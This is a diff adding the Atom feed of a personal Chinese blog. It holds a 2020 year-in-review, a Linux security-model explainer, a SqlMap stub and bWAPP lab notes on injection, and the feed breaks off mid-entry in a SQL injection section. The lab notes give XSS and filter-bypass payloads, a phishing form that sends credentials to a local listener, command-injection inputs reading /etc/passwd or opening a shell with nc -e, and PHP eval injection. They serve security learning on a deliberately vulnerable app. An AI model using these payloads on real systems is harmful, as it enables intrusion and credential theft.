@@ -1,0 +1,471 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>风景这边独好</title>
+  
+  <subtitle>小风大浪，地狱天堂</subtitle>
+  <link href="http://yejuns.github.io/atom.xml" rel="self"/>
+  
+  <link href="http://yejuns.github.io/"/>
+  <updated>2021-05-05T18:05:55.423Z</updated>
+  <id>http://yejuns.github.io/</id>
+  
+  <author>
+    <name>Ye-Jun</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2020-summary</title>
+    <link href="http://yejuns.github.io/2020/12/31/2020-summary/"/>
+    <id>http://yejuns.github.io/2020/12/31/2020-summary/</id>
+    <published>2020-12-31T13:50:32.000Z</published>
+    <updated>2021-05-05T18:05:55.423Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="我的2020年度总结"><a href="#我的2020年度总结" class="headerlink" title="我的2020年度总结"></a>我的2020年度总结</h1><p>  这是自己第一次写年度总结，也是第一次写自己的个人博客，在这2020年的最后一天，简单地给自己着过去的一年做一个总结，然后展望一下未来。</p><p>  想着在3月初的时候一个人在家无聊，就将自己的微信签名改成了“<strong>响风大浪，地狱天堂</strong>”，然后便决定去外面义工旅行。很庆幸自己在这样一个时刻做了这么一个决定，从而以较低的成本扩大了自己的眼界，也让我在旅行途中更加清晰地了解到了自己。从上海辗转到海南再到平潭，加上暑假里去的香格里拉与大理，认识了小听、小胖、小五姐，见到了蔚蓝的大海与梦幻的蓝眼泪，才发现这个世界真的可以如此之大，而不只是朝九晚五。闷了的时候确实可以出去走走，哪怕身无分文，但只要你愿意走出去，总是有路给我们走的。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/12-31-2.png"></p><p>  下图是三亚的某一天晚上，在隔壁民宿与客人一起玩桌游，看到帅气小哥弹吉他的时候就想，要是自己也会弹吉他该有多好。于是8月份在云南，恰好有朋友送自己一把吉他，花了3个月的时间去入门，现在已经差不多可以练习曲子了。所以，不要做白日梦，你看到的那些只要努力，都有可能变成你的，所以只要慢慢积累，等待就好。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/12-31-1.jpg"></p><p>  在这样的旅行途中，给我留下印象最深的算是小听和李礼了。小听是一个四川的女孩子，十分会玩，长的也很好看（没错，下面的背影就是小听的），遇到人特别热情。那天我在码头上看夕阳，海边的落日看上去总是比陆地上的要梦幻很多，我正沉浸在落日的温暖中，她从光晕中走来，向我微微一笑，“你好，我记得你，你也是这里的义工”。于是，我就记住了这样一个开朗的女孩子，也认识到了那些不一样的人有着不一样青春。如今的她还在海南当一名浪人，整日冲浪，祝愿她在接下来的一年心想事成。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/12-31-3.jpg"></p><p>  李礼是一个很有趣的男生，是我在昆明准备回南京的路上认识的。那天他和小白正打算出动物园拍一些视频，估计是看我背着一个吉他，以为我也是喜欢在外面疯的人，小白便约我一起去，庆幸自己并没有因为要看论文而拒绝他们，不然也不会知道今日头条上那种简单的视频居然也会有人爱看，而李礼靠着制作小视频的方式已经有了几千的粉丝，尽管他才运营了2个月。上个月看到他在鹤岗买了一套房，就是不知道接下来的一年他会在什么地方拍摄什么样的视频，只是祝愿他顺顺利利。</p><p> <img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/12-31-4.jpg"></p><p> 这一年除了玩，科研上的进步并不大，而实践能力自己明显提升了很多，主要原因就是帮助LL开发rundb数据库，虽说其实自己也就改了一部分代码，但对于商用软件的要求与一整套软件开发过程的了解，自己还是有很多的提升。而且在LL的疯狂push下，完全意识到了自己的不足，面向百度编程还是不可取，基本功是一定要扎实。而前几天连续熬了3天自己的精神状态也还可以，说明自己的熬夜能力还是有很大的进步空间。未来自己的求职方向主要是逆向以及网络安全这块，开发的压力实在太大，而且提升并不多，自己还是比较看好安全防御与攻击这方面。而英文文档的阅读能力在未来还需进一步提升，学会使用开源软件以及去开源社区学习是未来一年最重要的事。</p><p> 现在仔细一想，自己在这一年真的是经历了太多的事，义工旅行、加入天投会、认识小曹、学会弹吉他、开发rundb数据库。这一件一件的小事汇成了我的2020，希望我的2021年</p><ol><li>自己以及亲朋好友都健健康康；</li><li>自己在网络安全这块技术上有重大突破；</li><li>找到一个我喜欢、也喜欢我的女朋友；</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;我的2020年度总结&quot;&gt;&lt;a href=&quot;#我的2020年度总结&quot; class=&quot;headerlink&quot; title=&quot;我的2020年度总结&quot;&gt;&lt;/a&gt;我的2020年度总结&lt;/h1&gt;&lt;p&gt;  这是自己第一次写年度总结，也是第一次写自己的个人博客，在这2020年的最</summary>
+      
+    
+    
+    
+    
+    <category term="2020 年度总结" scheme="http://yejuns.github.io/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>创建我的个人博客</title>
+    <link href="http://yejuns.github.io/2020/12/31/Ademo/"/>
+    <id>http://yejuns.github.io/2020/12/31/Ademo/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-04T02:51:32.923Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="使用github搭建个人博客"><a href="#使用github搭建个人博客" class="headerlink" title="使用github搭建个人博客"></a>使用github搭建个人博客</h2><h2 id="踩坑的地方"><a href="#踩坑的地方" class="headerlink" title="踩坑的地方"></a>踩坑的地方</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;使用github搭建个人博客&quot;&gt;&lt;a href=&quot;#使用github搭建个人博客&quot; class=&quot;headerlink&quot; title=&quot;使用github搭建个人博客&quot;&gt;&lt;/a&gt;使用github搭建个人博客&lt;/h2&gt;&lt;h2 id=&quot;踩坑的地方&quot;&gt;&lt;a href=&quot;#</summary>
+      
+    
+    
+    
+    
+    <category term="测试" scheme="http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux 中的安全模型</title>
+    <link href="http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/"/>
+    <id>http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-25T08:58:17.139Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Linux-的构成"><a href="#Linux-的构成" class="headerlink" title="Linux 的构成"></a>Linux 的构成</h2><p>Linux 可以分为<code>内核层</code>和<code>用户层</code>。用户层通过内核层提供的操作接口，来执行各类任务</p><p>内核层提供的<code>权限划分、进程隔离和内存保护</code>的安全功能，是用户层的安全基础。一旦内核 安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存。</p><p>但作为使用者，对于内核层我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新。我们需要关注的是用户层的安全。</p><h2 id="用户层安全"><a href="#用户层安全" class="headerlink" title="用户层安全"></a>用户层安全</h2><p>在 Linux 中，用户层的所有操作，都可以抽象为<code>“主体 -&gt; 请求 -&gt; 客体”</code>这么一个流程。 比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。</p><p><img src="..%5Cimgs%5Cother%5Clinux_1.jpg" alt="用户请求操作"></p><p>在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。<br>Linux 用户层则需要确保权限的正确配置</p><h3 id="Linux中的认证机制"><a href="#Linux中的认证机制" class="headerlink" title="Linux中的认证机制"></a>Linux中的认证机制</h3><p>Linux是一个多用户操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有 2个比较关键的文件：<code>/etc/passwd</code>和<code>/etc/shadow</code></p><p><code>/etc/passwd</code>是全局可读的，不具备保密性。因此，<code>/etc/passwd</code>不会直接存储密码，而是用x来进行占位。那实际的用户密码信息，就会存储到仅ROOT可读的<code>/etc/shadow</code>中。</p><p>在<code>/etc/shadow</code>中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之<br>类的密码管理策略。我们可以通过Chage 命令来对密码管理策略进行修改,如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chage -M 60 ye</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制用户ye在 60 天内必须对密码进行修改</span></span><br></pre></td></tr></table></figure><p>因为认证这个功能是由Linux内核来提供的，所以在用户层，我们需要关心的,就是弱密码导致的身份信息泄漏。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过使用已知的弱密码库，来对 Linux 中的弱密码进行检测</p><h3 id="Linux-中的授权机制"><a href="#Linux-中的授权机制" class="headerlink" title="Linux 中的授权机制"></a>Linux 中的授权机制</h3><p>Linux对目录和文件除了<code>r,w,x</code>3种权限外，还提供了一些额外的权限标签，来进行更细粒度地权限控制</p><p>Linux 提供了文件属性的概念，来对文件设置更多的保护。通过<code>chattr +i /etc/passwd</code>可以防止文件被任何用户修改</p><p>Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如<br><code>chmod +t /tmp</code>可以阻止删除/tmp目录下其他用户的文件</p><p><code>要解决权限问题，我们就要实践最小权限原则。</code></p><p>Linux中最普遍的问题，就是滥用<code>Root</code>，很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境</p><p>但是，在 ROOT 的 Shell 环境中，启动的所有进程也都具备<code>ROOT</code>权限。如果启动的是一个立即返回的进程，如<code>CAT</code>,不会有太多问题，但如果是一个长期 运行的进程，就很容易产生权限的滥用。 比如，当你以<code>ROOT</code>的身份启动<code>Redis</code>或者 <code>MySQL</code> 时，如果这时有其他用户 连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。</p><p>谨记“最小权限”原则。也就是说，我们根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。</p><p>我们不需要自己去配置这些权限，而是常常使用一些已知的工具，来实现“最小权限”启动长驻进程的功能。</p><p>比如说，我们可以通过 mysqld 启动 MySQL 服务时，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT下建立<code>守护进程</code>(可以理解为服务)。</p><p>类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Linux-的构成&quot;&gt;&lt;a href=&quot;#Linux-的构成&quot; class=&quot;headerlink&quot; title=&quot;Linux 的构成&quot;&gt;&lt;/a&gt;Linux 的构成&lt;/h2&gt;&lt;p&gt;Linux 可以分为&lt;code&gt;内核层&lt;/code&gt;和&lt;code&gt;用户层&lt;/code</summary>
+      
+    
+    
+    
+    
+    <category term="Linux、安全" scheme="http://yejuns.github.io/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>web安全之SqlMap</title>
+    <link href="http://yejuns.github.io/2020/12/31/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
+    <id>http://yejuns.github.io/2020/12/31/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-06-21T11:08:12.602Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SqlMap源码解析"><a href="#SqlMap源码解析" class="headerlink" title="SqlMap源码解析"></a>SqlMap源码解析</h2><h3 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h3><p>首先看一下目录结构，我们将文档类的文件排除掉，只看系统类：<br>|    目录    | 说明 |<br>| :——:  | :—– |<br>| data/      |  数据库注入检测载荷、用户自定义攻击载荷、字典、shell命令、数据库触发顺序等 |<br>| extra/       |  一些额外功能，例如发出声响（beep）、运行cmd、安全执行、shellcode等 |<br>| lib/       |  包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。 |<br>| plugins/      |  数据库信息和数据库通用事项 |<br>| tamper/       |  绕过脚本 |<br>| thirdparty/      |  sqlmap使用的第三方的插件。 |<br>| sqlmap.conf      |  sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测） |<br>| sqlmap.py       |  sqlmap主程序文件 |<br>| sqlmapapi.py      | sqlmap的api文件，可以将sqlmap集成到其他平台上 |</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SqlMap源码解析&quot;&gt;&lt;a href=&quot;#SqlMap源码解析&quot; class=&quot;headerlink&quot; title=&quot;SqlMap源码解析&quot;&gt;&lt;/a&gt;SqlMap源码解析&lt;/h2&gt;&lt;h3 id=&quot;源码结构&quot;&gt;&lt;a href=&quot;#源码结构&quot; class=&quot;head</summary>
+      
+    
+    
+    
+    
+    <category term="SqlMap" scheme="http://yejuns.github.io/tags/SqlMap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>bwapp学习笔记-A1 Injection</title>
+    <link href="http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/"/>
+    <id>http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/</id>
+    <published>2020-12-31T08:01:51.000Z</published>
+    <updated>2021-07-01T11:38:53.786Z</updated>
+    
+    <content type="html"><![CDATA[<p>网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些</p><h2 id="HTML-Injection-Reflection-Get"><a href="#HTML-Injection-Reflection-Get" class="headerlink" title="HTML Injection-Reflection(Get)"></a>HTML Injection-Reflection(Get)</h2><h3 id="low-level"><a href="#low-level" class="headerlink" title="low level"></a>low level</h3><p>对于输入的数据没有验证，直接显示在页面上，因此可以注入XSS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 注入的代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alter(124)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="medium-level"><a href="#medium-level" class="headerlink" title="medium level"></a>medium level</h3><p>在源码中做了简单的字符替换（源码如下）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities</span></span><br><span class="line"><span class="variable">$input</span> = str_replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$input</span> = str_replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line"><span class="comment"># 对转换后的data还要进行url解码</span></span><br><span class="line"><span class="variable">$input</span> = urldecode(<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>因为对’&lt;’和’&gt;’都进行了html编码，所以在注入时可先对数据进行url编码，消除’&lt;’和’&gt;’，<code>因为后面会对输入的数据进行url解码</code>，所以可以注入成功。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 对 &lt; &gt; 经过url编码</span><br><span class="line">%3cscript%3ealter(124)%3c%2fscript%3e</span><br><span class="line">%3ca href = &quot;http://www.baidu.com&quot;%3eclick here %3c/a%3e</span><br></pre></td></tr></table></figure><h3 id="high-level"><a href="#high-level" class="headerlink" title="high level"></a>high level</h3><p>使用<code>htmlspecialchars</code>对数据进行编码，并且制定了字符编码方式为<code>utf-8</code>，避免了被<code>宽字节注入</code>，所以很难被绕过，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encoding</span> = <span class="string">&quot;UTF-8&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities</span></span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars(<span class="variable">$data</span>, ENT_QUOTES, <span class="variable">$encoding</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，同样是对输入的数据进行html编码，<code>medium</code>为什么可以使用<code>url编码</code>被绕过，而<code>high</code>不能被绕过。一个重要的原因是<code>medium</code>中对输入的数据还进行了<code>url解码</code>，所以注入的数据可以正常解析，从而实现攻击。</p><h3 id="额外补充"><a href="#额外补充" class="headerlink" title="额外补充"></a>额外补充</h3><ol><li><p><code>htmlentities</code>：将所有的字符进行html编码；</p><p> <code>htmlspecialchars</code>：只对”&amp;,”,’,&lt;,&gt;”进行html编码</p></li><li><p>使用<code>htmlspecialchars</code>后，想要对其进行绕过，一种可行的方法是对注入的数据进行<code>uft-7</code>编码，然后将页面的编码方式也设为<code>uft-7</code>。</p></li></ol><h2 id="HTML-Injection-Reflection-POST"><a href="#HTML-Injection-Reflection-POST" class="headerlink" title="HTML Injection-Reflection(POST)"></a>HTML Injection-Reflection(POST)</h2><p>与get类似</p><h2 id="HTML-Injection-Reflected-URL"><a href="#HTML-Injection-Reflected-URL" class="headerlink" title="HTML Injection - Reflected (URL)"></a>HTML Injection - Reflected (URL)</h2><p>主要的处理函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&quot;0&quot;</span> :</span><br><span class="line">       <span class="comment">// $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]);</span></span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>];</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;1&quot;</span> :</span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> :</span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>] . xss_check_3(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h3 id="low-level-1"><a href="#low-level-1" class="headerlink" title="low level"></a>low level</h3><p>使用burpsuit对发起的请求进行抓包，重新构造请求，就可以进行注入。</p><h3 id="medium-level-1"><a href="#medium-level-1" class="headerlink" title="medium level"></a>medium level</h3><p>旧的IE浏览器不会对‘&lt;’ 和 ‘&gt;’进行编码，所以可以进行DOM XSS注入</p><h3 id="high-level-1"><a href="#high-level-1" class="headerlink" title="high level"></a>high level</h3><p>无法绕过(对输入进行了<code>htmlentities</code>)</p><h2 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h2><h3 id="low-level-2"><a href="#low-level-2" class="headerlink" title="low level"></a>low level</h3><p>因为有输入的文本框，先考虑是否存在存储型XSS<br><img src="..%5Cimgs%5Cweb%5Cbwapp-1.png" alt="存储型XSS注入"></p><p>初次以外，我们还可以注入一个iframe进行钓鱼,比如在输入框中输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">div class=&quot;test_code&quot;&gt;test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;&quot;</span>&gt;</span></span><br><span class="line">Please Login Here To Proceed:</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:1234/hacked.html&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在127.0.0.1的主机上监听1234端口，比如我就使用nc监听了相关端口，<code>nc -lvnp 1234</code>,最后就可以得到用户的输入</p><p><img src="..%5Cimgs%5Cweb%5Cbwapp-2.png" alt="钓鱼获取用户输入"></p><h3 id="medium-level-2"><a href="#medium-level-2" class="headerlink" title="medium level"></a>medium level</h3><p>无法绕过</p><h3 id="high-level-2"><a href="#high-level-2" class="headerlink" title="high level"></a>high level</h3><p>无法绕过</p><h2 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h2><h3 id="low-level-3"><a href="#low-level-3" class="headerlink" title="low level"></a>low level</h3><p>根据get请求可知，直接修改ParamUrl参数即可，</p><ul><li><p>原始URL：<code>http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250</code></p></li><li><p>漏洞URL：<code>http://127.0.0.1/iframei.php?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250</code></p></li></ul><h3 id="medium-level-3"><a href="#medium-level-3" class="headerlink" title="medium level"></a>medium level</h3><p>对传入的URL使用<code>addslashes</code>函数进行处理，只会对<code>&#39; &quot; \ null</code>转义，因此依然可以绕过,只需要在ParamHeight后面闭合<iframw>即可，（或者使用 iframe 标签的 srcdoc 属性替换“src”属性的内容，达到更好的注入效果）</p><ul><li><p>漏洞URL：<code>ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;h2&gt;hello&lt;/h2&gt;&lt;!--</code></p></li><li><p>漏洞URL：<code>http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot; srcdoc&gt;&lt;/iframe&gt;&lt;iframe src=https://www.baidu.com width=800 height=1000&gt;&quot; </code></p></li></ul><h3 id="high-level-3"><a href="#high-level-3" class="headerlink" title="high level"></a>high level</h3><p>无法绕过</p><h2 id="LDAP-Injection"><a href="#LDAP-Injection" class="headerlink" title="LDAP Injection"></a>LDAP Injection</h2><p>LDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。 使用得最广泛的LDAP：ADAM和OpenLDAP。</p><h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>使用了shell_exec()方法，且没有过滤，可用命令</p><ol><li><a href="http://www.nsa.gov/">www.nsa.gov</a>; cat /etc/passwd</li><li><a href="http://www.nsa.gov/">www.nsa.gov</a> &amp; uname -a</li><li><a href="http://www.nsa.gov/">www.nsa.gov</a> | ps -ef</li><li>这种情况下，甚至可以获得一个反弹shell，<code>www.nsa.gov ; nc -vlp 1234 -e /bin/bash</code></li></ol><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>源码中对‘;’ ‘&amp;’进行了过滤，但仍然可以使用<code>|</code></p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>源码中使用了<code>escapeshellcmd</code>函数，确保用户只执行一个命令</p><h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection-Blind"></a>OS Command Injection-Blind</h2><p>盲注的思想在于根据请求的时间，来判断命令是否运行成功。</p><h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>根据首页可以推测，肯定是通过url进行php相关脚本的注入。</p><p>原始url：<code>http://192.168.50.151/phpi.php</code></p><p>恶意url：<code>http://192.168.50.151/phpi.php?message=phpinfo()</code></p><p>造成代码注入的原因是没有对输入进行过滤，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span> (<span class="string">&quot;echo &quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;message&quot;</span>] . <span class="string">&quot;;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="medium-amp-high"><a href="#medium-amp-high" class="headerlink" title="medium &amp; high"></a>medium &amp; high</h3><p>无法绕过，对输入进行了转义，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars(<span class="variable">$_REQUEST</span>[<span class="string">&quot;message&quot;</span>], ENT_QUOTES, <span class="string">&quot;UTF-8&quot;</span>);;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><ol><li><p>对于sql注入，我们首先要找到注入点<br><img src="..%5Cimgs%5Cweb%5Cbwapp-3.png" alt="确定sql注入点"></p></li><li><p>然后确定字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 8<span class="comment">#</span></span><br><span class="line">1&#x27; order by 7<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="..%5Cimgs%5Cweb%5Cbwapp-4.png"><br><img src="..%5Cimgs%5Cweb%5Cbwapp-5.png"></p></li><li><p>确定可注入的字段的位置,构造相关的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 